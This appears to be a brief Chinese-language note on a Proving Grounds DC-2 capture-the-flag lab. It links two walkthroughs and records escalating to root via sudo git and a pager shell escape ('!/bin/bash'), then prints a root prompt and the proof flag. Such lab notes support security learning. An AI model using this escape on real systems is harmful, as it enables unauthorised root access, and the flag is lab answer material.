参考资料  
[https://sanaullahamankorai.medium.com/proving-grounds-dc-2-walkthrough-efc4ccf46a1d](https://sanaullahamankorai.medium.com/proving-grounds-dc-2-walkthrough-efc4ccf46a1d)
   

表述完成的提权过程  
[https://medium.com/@blupien96/proving-grounds-play-dc-2-walkthrough-ca3084640a76](https://medium.com/@blupien96/proving-grounds-play-dc-2-walkthrough-ca3084640a76)
 
核心点需要切换到带有sudo的用户 git提权才完成
  提权需要耐心
 
最后提权  
The type specifier can be either --int or --bool, to make git config ensure that the variable(s) are of the given type and convert the value to the canonical form  
(simple decimal number for int, a "true" or "false" string for bool), or --path, which does some path expansion (see --path below). If no type specifier is passed, no  
!/bin/bash  
root@DC-2:/home/tom/usr/bin#  
root@DC-2:/home/tom/usr/bin# cd  
root@DC-2:~# ls  
final-flag.txt proof.txt  
root@DC-2:~# cat proof.txt  
735cafd24c38653bf99ef48bff1f72cc  
root@DC-2:~#  
root@DC-2:~#